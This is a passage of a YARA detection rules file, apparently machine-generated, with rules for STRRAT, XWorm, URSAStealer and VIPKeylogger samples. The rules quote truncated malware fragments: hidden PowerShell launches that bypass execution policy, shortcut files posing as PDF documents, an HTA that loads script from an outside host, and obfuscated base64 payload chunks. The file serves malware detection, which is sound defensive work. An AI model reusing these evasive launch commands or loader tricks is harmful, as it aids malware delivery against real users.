      description = "_subset_batch - file STRRAT(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4ebef5d23ce0fe6c2940ba7a2f6bfc512b1ec5f01458284d2ce0e71ee8787b81"
   strings:
      $x1 = "rRtxOVXoigAOOxhjDaEHuLzuoPuaVGggDzOY = rRtxOVXoigAOOxhjDaEHuLzuoPuaVGggDzOY & \"dmZ5Y2NqZUtMVVAgPSAiIiANCkJlZUl0Q3V3SlZVeU4gPSAx" ascii /* score: '50.00'*/
      $x2 = "vniDmjGqHxTUkvHdHHXfoagBWik = vniDmjGqHxTUkvHdHHXfoagBWik & \"SENXc0xZWm9hZUpSdW9JdDEreUt5UnZZVVhjNjA2RzVGa1I4c1FFZWRXVUhUcWtycn" ascii /* score: '48.00'*/
      $x3 = "vniDmjGqHxTUkvHdHHXfoagBWik = vniDmjGqHxTUkvHdHHXfoagBWik & \"TGp6SkVFaFFMZmVFS0lBUlZyV09BclpMYmdXdUNjUEpkID0gIiIgDQpxZUpxbEtIID" ascii /* score: '44.00'*/
      $x4 = "HMk5ISVAvWERsTE5zRFNCRzJNa1Y0V0FrTkZBS2REMmRJVm1mcTZ5MzJQK2JMcVliNGZlOTdOQmxRbzc1dllxVTk1SkxWQWc4eVdaczJzK2c4ZXl1YndPaktGeTBGVTh" ascii /* base64 encoded string '2NHIP/XDlLNsDSBG2MkV4WAkNFAKdD2dIVmfq6y32P+bLqYb4fe97NBlQo75vYqU95JLVAg8yWZs2s+g8eyubwOjKFy0FU8' */ /* score: '31.00'*/
      $s5 = "OdVNBODZBT0lBd1JIQkFJNEF3UVhhQU1RdzBpckJCc0VCNVNqQkFPY0d3UUhlS01Zc3hndkhBTUh1cmdUQkFPOSt3UURuQnNFQjN5akdMTWNLeHdEQjhLNEV3UUR2ZnN" ascii /* base64 encoded string 'uSA86AOIAwRHBAI4AwQXaAMQw0irBBsEB5SjBAOcGwQHeKMYsxgvHAMHurgTBAO9+wQDnBsEB3yjGLMcKxwDB8K4EwQDvfs' */ /* score: '29.00'*/
      $s6 = "QeHdPcHhTTmphNklnOWJnbzhuK2dpTURTN2loOUtWaHlvT3hHWUJ4dllHRFFkNVhXT3pDNlM1d3krT2dsSVZLNmp5MzBwV0ZpZkdiVzd2Ylp0QS9hRytibFdVTTVNN21" ascii /* base64 encoded string 'xwOpxSNja6Ig9bgo8n+giMDS7ih9KVhyoOxGYBxvYGDQd5XWOzC6S5wy+OglIVK6jy30pWFifGbW7vbZtA/aG+blWUM5M7m' */ /* score: '29.00'*/
      $s7 = "FQjVDakhBTUhrcmdUQkFPOSt4d0RCNXE0RXdRRHZmc2NBd2VpdUJNRUE3MzdIQU1IcXJnVEJBTzkrN2l6SkRKbU95d0RCVGI5WVR3ckJBSXgrbUZ2SEFNRVQ2UXJCQU5" ascii /* base64 encoded string 'B5CjHAMHkrgTBAO9+xwDB5q4EwQDvfscAweiuBMEA737HAMHqrgTBAO9+7izJDJmOywDBTb9YTwrBAIx+mFvHAMET6QrBAN' */ /* score: '29.00'*/
      $s8 = "FQXdRRGlRQUFSUVFEQkFNRWp3UUN4QU5mR3N4VEhBTUFXcmdUQkFPOSt4UURCTHI4QXh3REFGNjRLd1FDT0tNUVJ6UnZCQU1oMHl3REJ1T2tLd1FDUktOb0F3UWtSQ3N" ascii /* base64 encoded string 'AwQDiQAARQQDBAMEjwQCxANfGsxTHAMAWrgTBAO9+xQDBLr8AxwDAF64KwQCOKMQRzRvBAMh0ywDBuOkKwQCRKNoAwQkRCs' */ /* score: '29.00'*/
      $s9 = "LOVEyemlQZ2lTcWdpT3lTdUwxK29FcEpsNkdna1M2ckw1Snl2aFFCTHJxc25Ndy9EVWRpR3hXTWlxNzI2Njg4ZmMzS2ttK25XeFE3T0QyNTQ2S25WemZ2aG1RUndHNDQ" ascii /* base64 encoded string '9Q2ziPgiSqgiOySuL1+oEpJl6GgkS6rL5JyvhQBLrqsnMw/DUdiGxWMiq726688fc3Kkm+nWxQ7OD2546KnVzfvhmQRwG44' */ /* score: '29.00'*/
      $s10 = "5bC9EZnkxVHYrNm1HWUZIU3NJRDlLYUE5eEVTQlpLOENrcmdBeDlnNUMvRnpaZ3h1M3ludVJxWFhTV2VvMkI4SUVSZ0t1MVR4eDJEVWt3MEMrYU5GUkRMSEExRlB5alJ" ascii /* base64 encoded string 'l/Dfy1Tv+6mGYFHSsID9KaA9xESBZK8CkrgAx9g5C/FzZgxu3ynuRqXXSWeo2B8IERgKu1Txx2DUkw0C+aNFRDLHA1FPyjR' */ /* score: '29.00'*/
      $s11 = "xUXdRREJBT0pBTnp5QW85U1FvQ1BCQ3NFQTF5aWF3Qm9wSVFEQkFNRWpnTmZQNEEwZ3dRRGlBTUVHd1FISmI4VUF3UzYvQU1FQVdEbkhBTUhPcmdUQkFPOSt3UURCQnN" ascii /* base64 encoded string 'QwQDBAOJANzyAo9SQoCPBCsEA1yiawBopIQDBAMEjgNfP4A0gwQDiAMEGwQHJb8UAwS6/AMEAWDnHAMHOrgTBAO9+wQDBBs' */ /* score: '29.00'*/
      $s12 = "PckFSQjNCQUFBQUVNTG1RQ0NBNndCR25jRUFDQUFRd3RTRzRjRHJBRWpkd1FBQUFCREN5OFVyZ090QVMxM0JBQWdBRU1MVWh5ekE2MEJObmNFQUFBQVFRdllBMEFFcmd" ascii /* base64 encoded string 'rARB3BAAAAEMLmQCCA6wBGncEACAAQwtSG4cDrAEjdwQAAABDCy8UrgOtAS13BAAgAEMLUhyzA60BNncEAAAAQQvYA0AErg' */ /* score: '29.00'*/
      $s13 = "wMEZhb2NCWDlhdlZscmdVUERHbElVRXdLL0V6T2NXWm9pQVdKQjV3Y0xlNFlsSm5vWThFRjgvOTdMZUx5R2hxbHR4eldvWlhaL2NmSHFRWmhoWDNPVWhaYTJaYVZlVHk" ascii /* base64 encoded string '0FaocBX9avVlrgUPDGlIUEwK/EzOcWZoiAWJB5wcLe4YlJnoY8EF8/97LeLyGhqltxzWoZXZ/cfHqQZhhX3OUhZa2ZaVeTy' */ /* score: '29.00'*/
      $s14 = "FQTczN0hBTUFRcmdUQkFPOSt4d0RCL3E0RXdRRHZmc1VBd1ZhNkJNRUE3MzdIQU1BR3JnVEJBTzkrd1FiQkFkQnZ4d0RCTk9rS3dRREpiOHNBd1ltdUNzRUFTVytZanN" ascii /* base64 encoded string 'A737HAMAQrgTBAO9+xwDB/q4EwQDvfsUAwVa6BMEA737HAMAGrgTBAO9+wQbBAdBvxwDBNOkKwQDJb8sAwYmuCsEASW+Yjs' */ /* score: '29.00'*/
      $s15 = "rbzBvT2M1UzU1SkNkTEZoTFRsdFloK3UxMGY5WnBuWmM3di95S1Mya3RNRWk3WWdTempNeDNrZ08zWFEzT0dJSkxZRnptK1A1U3JkVmFkR3lhU1R5TmhWVjJNcktUY1R" ascii /* base64 encoded string 'o0oOc5S55JCdLFhLTltYh+u10f9ZpnZc7v/yKS2ktMEi7YgSzjMx3kgO3XQ3OGIJLYFzm+P5SrdVadGyaSTyNhVV2MrKTcT' */ /* score: '28.00'*/
   condition:
      uint16(0) == 0x6e6f and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule STRRAT_signature__d4c09741 {
   meta:
      description = "_subset_batch - file STRRAT(signature)_d4c09741.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d4c097412ab05630e6cb97b544dc7c0a0e238a4bdf5c79da679c7545face2dad"
   strings:
      $x1 = "mzIePZAkpHPgUPKpHbPmqmgclQucLvMfFIKjlJURmAusGST = \"\" ;WgxkEnUESKrNhwitnjrmlkAVyntrtXxLHY = WgxkEnUESKrNhwitnjrmlkAVyntrtXxLHY " ascii /* score: '50.00'*/
      $x2 = "mzIePZAkpHPgUPKpHbPmqmgclQucLvMfFIKjlJURmAusGST = mzIePZAkpHPgUPKpHbPmqmgclQucLvMfFIKjlJURmAusGST + \"SENXc0xZWm9hZUpSdW9JdDEreU" ascii /* score: '48.00'*/
      $x3 = "mzIePZAkpHPgUPKpHbPmqmgclQucLvMfFIKjlJURmAusGST = mzIePZAkpHPgUPKpHbPmqmgclQucLvMfFIKjlJURmAusGST + \"TGp6SkVFaFFMZmVFS0lBUlZyV0" ascii /* score: '44.00'*/
      $x4 = "EcExqZ0gzc3BpOStlTFo5MGFSWURsemUvZ2x5UGdlL2NwWWdyM05taGg2UXVQdU5CWHhkSlBjcWg0MXpNdlQxVHhIVThOZ0xoK0lDZlkzdDZVYjZta2VxdmpkUWZtR21" ascii /* base64 encoded string 'pLjgH3spi9+eLZ90aRYDlze/glyPge/cpYgr3Nmhh6QuPuNBXxdJPcqh41zMvT1TxHU8NgLh+ICfY3t6Ub6mkeqvjdQfmGm' */ /* score: '31.00'*/
      $x5 = "yZEpSSEpsWnpFNE1FUkZRemhEUmpNek5FUXlOamM1TkRJMlJqYzBPVE0wT1RVMFJVTTVRMHhUU1VSY2UwVXhSREpDUmpReUxVRTVOa0l0TVRGRU1TMDVRelpDTFRBd01" ascii /* base64 encoded string 'dJRHJlZzE4MERFQzhDRjMzNEQyNjc5NDI2Rjc0OTM0OTU0RUM5Q0xTSURce0UxRDJCRjQyLUE5NkItMTFEMS05QzZCLTAwM' */ /* score: '31.00'*/
      $s6 = "BRU1MVWh5ekE2MEJObmNFQUFBQVFRdllBMEFFcmdGQWR3UUFJQUJCQzhRYlJRU3VBVWwzQkFBQUFFRUxRd1ZBQks4QlUzY0VBQ0FBUVF1UEZrVUVyd0ZjZHdRQUFBQkJ" ascii /* base64 encoded string 'EMLUhyzA60BNncEAAAAQQvYA0AErgFAdwQAIABBC8QbRQSuAUl3BAAAAEELQwVABK8BU3cEACAAQQuPFkUErwFcdwQAAABB' */ /* score: '29.00'*/
      $s7 = "2R2N1QVFDQXJRdWRHZjQ4WTRTeFVoWkVMMDI4VEY5bC9EZnkxVHYrNm1HWUZIU3NJRDlLYUE5eEVTQlpLOENrcmdBeDlnNUMvRnpaZ3h1M3ludVJxWFhTV2VvMkI4SUV" ascii /* base64 encoded string 'GcuAQCArQudGf48Y4SxUhZEL028TF9l/Dfy1Tv+6mGYFHSsID9KaA9xESBZK8CkrgAx9g5C/FzZgxu3ynuRqXXSWeo2B8IE' */ /* score: '29.00'*/
      $s8 = "4d0RBQUs0RXdRRHZmc0VHd1FDdUtNY0F3QWl1Qk1FQTczN0hBTUFRcmdUQkFPOSt4d0RCL3E0RXdRRHZmc1VBd1ZhNkJNRUE3MzdIQU1BR3JnVEJBTzkrd1FiQkFkQnZ" ascii /* base64 encoded string 'wDAAK4EwQDvfsEGwQCuKMcAwAiuBMEA737HAMAQrgTBAO9+xwDB/q4EwQDvfsUAwVa6BMEA737HAMAGrgTBAO9+wQbBAdBv' */ /* score: '29.00'*/
      $s9 = "2WERCQjYxeXdRckJBTmNvbUFyQkFJMG9nYVlEQU1FQXdRRGlRQUFSUVFEQkFNRWp3UUN4QU5mR3N4VEhBTUFXcmdUQkFPOSt4UURCTHI4QXh3REFGNjRLd1FDT0tNUVJ" ascii /* base64 encoded string 'XDBB61ywQrBANcomArBAI0ogaYDAMEAwQDiQAARQQDBAMEjwQCxANfGsxTHAMAWrgTBAO9+xQDBLr8AxwDAF64KwQCOKMQR' */ /* score: '29.00'*/
      $s10 = "5d0RCRnVsWXl3REJJK2xBSDhoaEFNRUF3U09CN25OdVNBODZBT0lBd1JIQkFJNEF3UVhhQU1RdzBpckJCc0VCNVNqQkFPY0d3UUhlS01Zc3hndkhBTUh1cmdUQkFPOSt" ascii /* base64 encoded string 'wDBFulYywDBI+lAH8hhAMEAwSOB7nNuSA86AOIAwRHBAI4AwQXaAMQw0irBBsEB5SjBAOcGwQHeKMYsxgvHAMHurgTBAO9+' */ /* score: '29.00'*/
      $s11 = "vTUNXd0tHQW9NQ2dnS0lBbFFDTHdLWUFwc0NtQUtiQWtFQ21BS1hBcDBDVkFJdkFsUUM5UUd4QXJRQ1FBSnpBbFFDTHdLL0FzRUN3d0xHQXZVQjlRSE9BdEVDMHdMVkF" ascii /* base64 encoded string 'MCWwKGAoMCggKIAlQCLwKYApsCmAKbAkECmAKXAp0CVAIvAlQC9QGxArQCQAJzAlQCLwK/AsECwwLGAvUB9QHOAtEC0wLVA' */ /* score: '29.00'*/
      $s12 = "heTNzUnhnalhRM1IyTFdUbzJHeGgxVUgxV0VlclJ3cVk4enN4UU54US9GRkEyeDFGM2xyYVgwVE9JdWpqRU9JMHVQY1QxWmVzTCtLTmNkdmZSL041d0ZLNkFhQUVRQS9" ascii /* base64 encoded string 'y3sRxgjXQ3R2LWTo2Gxh1UH1WEerRwqY8zsxQNxQ/FFA2x1F3lraX0TOIujjEOI0uPcT1ZesL+KNcdvfR/N5wFK6AaAEQA/' */ /* score: '29.00'*/
      $s13 = "wcDlHeW12YitaWmFyZk9sNjkrWVhvZ0RZQSs4WlFQeHdPcHhTTmphNklnOWJnbzhuK2dpTURTN2loOUtWaHlvT3hHWUJ4dllHRFFkNVhXT3pDNlM1d3krT2dsSVZLNmp" ascii /* base64 encoded string 'p9Gymvb+ZZarfOl69+YXogDYA+8ZQPxwOpxSNja6Ig9bgo8n+giMDS7ih9KVhyoOxGYBxvYGDQd5XWOzC6S5wy+OglIVK6j' */ /* score: '29.00'*/
      $s14 = "ZeG92azhwVEFxM0dHMTNGTEhtQUl5S3pHM1c5R1hwMEZhb2NCWDlhdlZscmdVUERHbElVRXdLL0V6T2NXWm9pQVdKQjV3Y0xlNFlsSm5vWThFRjgvOTdMZUx5R2hxbHR" ascii /* base64 encoded string 'xovk8pTAq3GG13FLHmAIyKzG3W9GXp0FaocBX9avVlrgUPDGlIUEwK/EzOcWZoiAWJB5wcLe4YlJnoY8EF8/97LeLyGhqlt' */ /* score: '29.00'*/
      $s15 = "3UzYvQU1FQVdEbkhBTUhPcmdUQkFPOSt3UURCQnNFQjVDakhBTUhrcmdUQkFPOSt4d0RCNXE0RXdRRHZmc2NBd2VpdUJNRUE3MzdIQU1IcXJnVEJBTzkrN2l6SkRKbU9" ascii /* base64 encoded string 'S6/AMEAWDnHAMHOrgTBAO9+wQDBBsEB5CjHAMHkrgTBAO9+xwDB5q4EwQDvfscAweiuBMEA737HAMHqrgTBAO9+7izJDJmO' */ /* score: '29.00'*/
   condition:
      uint16(0) == 0x6757 and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule XWorm_signature_ {
   meta:
      description = "_subset_batch - file XWorm(signature).vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eaa6450706a6f75fdd7f54d870cad6c8af5ddfeb03641206a94cde68919be8af"
   strings:
      $x1 = "        startupCmd = \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"\"\" & startupPsFile & \"\"\"\"" fullword ascii /* score: '38.00'*/
      $x2 = "        psCmd = \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"\"\" & psFile & \"\"\"\"" fullword ascii /* score: '38.00'*/
      $s3 = "GRkZGRjM4NkEyMzAwMDAxMTI2MDAyODJCMDAwMDBBNzI0NjYyMEY3MDI4MkMwMDAwMEE2RjJEMDAwMDBBMTYyOEJGMDAwMDBBMTY0MDM4MDAwMDAwMDAyODJCMDAwMDB" ascii /* base64 encoded string 'FFFF386A230000112600282B00000A7246620F70282C00000A6F2D00000A1628BF00000A16403800000000282B00000' */ /* score: '27.00'*/
      $s4 = "wMDAwMDA2QTIwNjE3MDAyODJCMDAwMDBBNzIzNTZFMEY3MDI4MkMwMDAwMEE2RjJEMDAwMDBBMjg3MDAwMDAwNkEyMDYxODAwMjgyQjAwMDAwQTcyNTA2RjBGNzAyODJ" ascii /* base64 encoded string '000006A2061700282B00000A72356E0F70282C00000A6F2D00000A2870000006A2061800282B00000A72506F0F70282' */ /* score: '27.00'*/
      $s5 = "CMDAwMDBBNzJFRTcyMEY3MDI4MkMwMDAwMEE2RjJEMDAwMDBBMjg3MDAwMDAwNkEyMDYxQjAwMjgyQjAwMDAwQTcyNjk3NDBGNzAyODJDMDAwMDBBNkYyRDAwMDAwQTI" ascii /* base64 encoded string '00000A72EE720F70282C00000A6F2D00000A2870000006A2061B00282B00000A7269740F70282C00000A6F2D00000A2' */ /* score: '27.00'*/
      $s6 = "wY21saWRYUmxjd0VBQUFBSGRtRnNkV1ZmWHdBSUFnQUFBQUJnQUFBTEFnQkNBQUVBQUFELy8vLy9BUUFBQUFBQUFBQUVBUUFBQUNCVGVYTjBaVzB1UjJ4dlltRnNhWHB" ascii /* base64 encoded string 'cmlidXRlcwEAAAAHdmFsdWVfXwAIAgAAAABgAAALAgBCAAEAAAD/////AQAAAAAAAAAEAQAAACBTeXN0ZW0uR2xvYmFsaXp' */ /* score: '26.00'*/
      $s7 = "BQUFEQUxuSnpjbU1BQUFCMEF3QUFBS0FBQUFBRUFBQUFXQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFRQzV5Wld4dll3QUFEQUFBQUFEQUFBQUFBZ0FBQUZ3QUFBQUFBQUF" ascii /* base64 encoded string 'AADALnJzcmMAAAB0AwAAAKAAAAAEAAAAWAAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAADAAAAAAgAAAFwAAAAAAAA' */ /* score: '26.00'*/
      $s8 = "BUkdWc1pXZGhkR1VBVTBoUFQxUUFjR0YwYUFCQ2VYUmxBSEJoZVd4dllXUUFTVzUwTVRZQVUybDZaVTltQUVWdGNIUjVBRnBsY204QVJYaGpaWEIwYVc5dUFFSnBkRU5" ascii /* base64 encoded string 'RGVsZWdhdGUAU0hPT1QAcGF0aABCeXRlAHBheWxvYWQASW50MTYAU2l6ZU9mAEVtcHR5AFplcm8ARXhjZXB0aW9uAEJpdEN' */ /* score: '26.00'*/
      $s9 = "BQXdnSUlGTjVjM1JsYlM1SGJHOWlZV3hwZW1GMGFXOXVMbE52Y25SV1pYSnphVzl1Q1FVQUFBQUFBQUFBZndBQUFBb0VBd0FBQUIxVGVYTjBaVzB1UjJ4dlltRnNhWHB" ascii /* base64 encoded string 'AwgIIFN5c3RlbS5HbG9iYWxpemF0aW9uLlNvcnRWZXJzaW9uCQUAAAAAAAAAfwAAAAoEAwAAAB1TeXN0ZW0uR2xvYmFsaXp' */ /* score: '26.00'*/
      $s10 = "runner.Execute" fullword ascii /* score: '25.00'*/
      $s11 = "5MUYwRDdFMkQwMDAwMDQyODIzMDAwMDBBQTIwOTFGMEUyODY5MDAwMDA2QTIwOTFGMEY3RTJEMDAwMDA0MjgyMzAwMDAwQUEyMDkxRjEwMjg2QTAwMDAwNkEyMDkxRjE" ascii /* base64 encoded string '1F0D7E2D000004282300000AA2091F0E2869000006A2091F0F7E2D000004282300000AA2091F10286A000006A2091F1' */ /* score: '24.00'*/
      $s12 = "5MDA1MTAwMzEwMDRBMDAzMTAwNjUwMDZFMDA3MDAwNkMwMDU5MDA1ODAwNkMwMDc4MDA2NDAwNkMwMDcwMDA3NTAwNjIwMDZCMDA1MjAwNDgwMDU3MDA0ODAwNDYwMDU" ascii /* base64 encoded string '00510031004A00310065006E0070006C00590058006C00780064006C007000750062006B00520048005700480046005' */ /* score: '24.00'*/
      $s13 = "wNTYwMDQ3MDA2NDAwMzUwMDYxMDAzMzAwNDYwMDQyMDA1MTAwNkUwMDVBMDA3QTAwNTYwMDMyMDA3NDAwNkQwMDYzMDA0NzAwNzgwMDZCMDA1OTAwMzMwMDY4MDAzMjA" ascii /* base64 encoded string '5600470064003500610033004600420051006E005A007A005600320074006D006300470078006B00590033006800320' */ /* score: '24.00'*/
      $s14 = "CMDA3ODAwNzQwMDYyMDA2RDAwNzQwMDQ5MDA1MTAwMzAwMDM5MDAzMDAwNjUwMDU4MDA2QzAwNkEwMDU2MDAzMDAwMzUwMDQ5MDA1MjAwNkIwMDcwMDAzMzAwNTQwMDQ" ascii /* base64 encoded string '007800740062006D00740049005100300039003000650058006C006A00560030003500490052006B007000330054004' */ /* score: '24.00'*/
      $s15 = "wNTMwMDZCMDA1NjAwNTQwMDUxMDAzMjAwNTYwMDU4MDA1NzAwNDgwMDUyMDA0OTAwNTcwMDU3MDA2NDAwNDUwMDYxMDA2RDAwNTIwMDM0MDA2MTAwNTUwMDZDMDA3QTA" ascii /* base64 encoded string '53006B005600540051003200560058005700480052004900570057006400450061006D0052003400610055006C007A0' */ /* score: '24.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__2 {
   meta:
      description = "_subset_batch - file XWorm(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "380ae97d07cc28496c275f59f9acbbaf664a2308c8af5429a1881dfa7468e63a"
   strings:
      $x1 = "/c powershell.exe -w h -ep bypass -nop -Command \"$CFIQpT='d+HJ>5eyR@T+V#m<N:j*d#ko?9T}m)V&3!LU@9[i:a}mVjd[C@B@O^ZXQ}u,V2V|iQ2@x" wide /* score: '47.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "Pdf Document'..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 6KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__615e417a {
   meta:
      description = "_subset_batch - file XWorm(signature)_615e417a.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "615e417ae6aa659a89189b5fa0fa602fb29a04268057365803f697ad62d87863"
   strings:
      $x1 = "/c powershell.exe -w h -ep bypass -nop -Command \"$HEUpJI='d_H$J*5e[y!R)2b)l@p!a:dW}M9&T%m^V^3L!U9:i_am^V@jd:C_BO)ZXQ_u|V?2;V]i^" wide /* score: '47.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "Pdf Document'..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 6KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__fbb56386 {
   meta:
      description = "_subset_batch - file XWorm(signature)_fbb56386.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fbb5638602f83732437079c66fecd2dd82476524be88c4e72e08500cb2a28bf1"
   strings:
      $x1 = "/c powershell.exe -w h -ep bypass -nop -Command \"$NopUgZ='d@HJ5,e|yR)l:S2x%Sd?n!c|9T$m<V}3(L$U>9i&a$mV!j+d.C*B$OZ;XQ?u@V*2<V^i[" wide /* score: '43.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "Pdf Document'..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 6KB and
      1 of ($x*) and all of them
}

rule URSAStealer_signature_ {
   meta:
      description = "_subset_batch - file URSAStealer(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cfe3c89bac97529aa43cb37092889fe5e1fe2c760823a8a642d18326ecb383f5"
   strings:
      $s1 = "        TJ0dY247.src = cluxek60+ 'tt' + tZ8R4 + ':/' + '/222.20.205.92.host.secureserver.net/tZ8R4/tZ8R4mde2/WgEa991.' + 'j' + '" ascii /* score: '16.00'*/
      $s2 = "        TJ0dY247.src = cluxek60+ 'tt' + tZ8R4 + ':/' + '/222.20.205.92.host.secureserver.net/tZ8R4/tZ8R4mde2/WgEa991.' + 'j' + '" ascii /* score: '16.00'*/
      $s3 = "The rainy season runs from late August through November, and the dry season runs from November through April. The hurricane seas" ascii /* score: '13.00'*/
      $s4 = "ppen Aw), with little temperature difference between months, but pronounced rainy and dry seasons. The city is hot year-round, a" ascii /* score: '11.00'*/
      $s5 = "daytime temperatures around 1 to 2 " fullword ascii /* score: '11.00'*/
      $s6 = "n current continually bringing warm water from further south, the sea temperature is always very warm, with lows of 79 " fullword ascii /* score: '11.00'*/
      $s7 = "ppen Aw), with little temperature difference between months, but pronounced rainy and dry seasons. The city is hot year-round, a" ascii /* score: '11.00'*/
      $s8 = "n Peninsula, sea breezes restrict high temperatures from reaching 36 " fullword ascii /* score: '11.00'*/
      $s9 = "nd moderated by onshore trade winds, with an annual mean temperature of 27.1 " fullword ascii /* score: '11.00'*/
      $s10 = "led to provide public services for the constant influx of people, as well as limiting squatters and irregular developments, whic" ascii /* score: '10.00'*/
      $s11 = "n's mainland or downtown area has diverged from the original plan; development is scattered around the city. The remaining undev" ascii /* score: '9.00'*/
      $s12 = "n and other Mexican states. A growing number are from the rest of the Americas and Europe. The municipal authorities have strugg" ascii /* score: '9.00'*/
      $s13 = "Juarez to the north, continuing along Bonampak and south toward the airport along Boulevard Donaldo Colosio. One development abu" ascii /* score: '9.00'*/
      $s14 = "Etymology and coat of arms" fullword ascii /* score: '9.00'*/
      $s15 = "cluxek60 = 'S' + cluxek60 + tZ8R4;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      8 of them
}

rule XWorm_signature__c9a958ac {
   meta:
      description = "_subset_batch - file XWorm(signature)_c9a958ac.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c9a958ace7218656d3f77839264bdd3e4ac811affe5fdb9e3452180a82db87c2"
   strings:
      $s1 = "babblery.TargetPath = WScript.ScriptFullName;" fullword ascii /* score: '27.00'*/
      $s2 = "corkboard('Files to be processed:\\n\\t' + pencion.join('\\n\\t'));" fullword ascii /* score: '25.00'*/
      $s3 = "        var pericladium = kerolite.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s4 = "var disquiet = WScript.ScriptFullName.replace(/[^\\\\]+$/, '') + 'viatiques2fb.xsl';" fullword ascii /* score: '21.00'*/
      $s5 = "corkboard.quirl = WScript.FullName.match(/cscript\\.exe$/i) && WScript.Arguments.Named.Exists('V');" fullword ascii /* score: '20.00'*/
      $s6 = "babblery.Description = 'Convert .DOC to .' + key.toUpperCase();" fullword ascii /* score: '19.00'*/
      $s7 = "WScript.Echo(retraverse);" fullword ascii /* score: '18.00'*/
      $s8 = "        var modernista = kerolite.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s9 = "viatiques.XMLSaveThroughXSLT = '' + diospyrales;" fullword ascii /* score: '16.00'*/
      $s10 = "g('\" + this[\"Hawkeye\"] + \"'" fullword ascii /* score: '16.00'*/
      $s11 = "// Process file list" fullword ascii /* score: '15.00'*/
      $s12 = "corkboard('Processing arguments');" fullword ascii /* score: '15.00'*/
      $s13 = "var diospyrales = superexcited.GetFile(disquiet);" fullword ascii /* score: '14.00'*/
      $s14 = "babblery.Arguments = '/f:' + key;" fullword ascii /* score: '14.00'*/
      $s15 = "+ e.description);" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule XWorm_signature__f611a628 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f611a628.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f611a628b996fac6ef0178a70b452e97c69b00dbbb5714469c746613e48725aa"
   strings:
      $s1 = "        var silicomethane = shadine.Get(\"Win32_Process\");" fullword ascii /* score: '26.00'*/
      $s2 = "        var succubuses = shadine.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s3 = "        this[\"immunization\"] = this[\"domesticity\"].GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g('\" + this[\"oxofluorides\"] + \"'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash_ {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "263ca2a7c9b0cb45ba0d43c162c77428a7bc51a6818ea3c5a0faeec08cb7d6ad"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s5 = "naalene forbehandlede.exe" fullword wide /* score: '19.00'*/
      $s6 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s7 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s8 = "mobilisnwr bingoers" fullword wide /* score: '9.00'*/
      $s9 = "gawks datatransporter" fullword wide /* score: '9.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__a1443ce2 {
   meta:
